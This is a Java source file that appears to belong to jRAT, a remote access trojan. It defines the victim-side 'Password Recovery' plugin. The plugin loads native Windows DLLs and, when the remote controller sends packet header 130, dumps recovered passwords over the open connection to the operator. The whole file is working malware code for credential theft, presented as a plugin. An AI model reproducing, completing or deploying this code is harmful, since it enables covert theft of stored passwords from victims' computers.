package jrat.plugin.recovery.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.stub.StubPlugin;
import libloader.GlobalLibraries;
import libloader.ResourceLibrary;

import com.redpois0n.oslib.Arch;
import com.redpois0n.oslib.OperatingSystem;

@SuppressWarnings("unused")
public class RecoveryPlugin extends StubPlugin {
	
	public static final short HEADER = 130;
	
	private DataInputStream dis;
	private DataOutputStream dos;

	@Override
	public void onDisconnect(Exception ex) throws Exception {
		
	}

	@Override
	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
		this.dis = dis;
		this.dos = dos;
	}

	@Override
	public void onPacket(short header) throws Exception {
		if (header == HEADER) {
			Recovery.dump(dos);
		}
	}
	
	@Override
	public void onEnable() throws Exception {
		ResourceLibrary w64 = new ResourceLibrary("/natives/windows_64.dll", OperatingSystem.WINDOWS, Arch.x86_64);
		ResourceLibrary w32 = new ResourceLibrary("/natives/windows_32.dll", OperatingSystem.WINDOWS, Arch.x86);

		GlobalLibraries.addLibrary(w64);
		GlobalLibraries.addLibrary(w32);

		GlobalLibraries.loadLibraries();
	}
	
	@Override
	public String getName() {
		return "Password Recovery";
	}

}
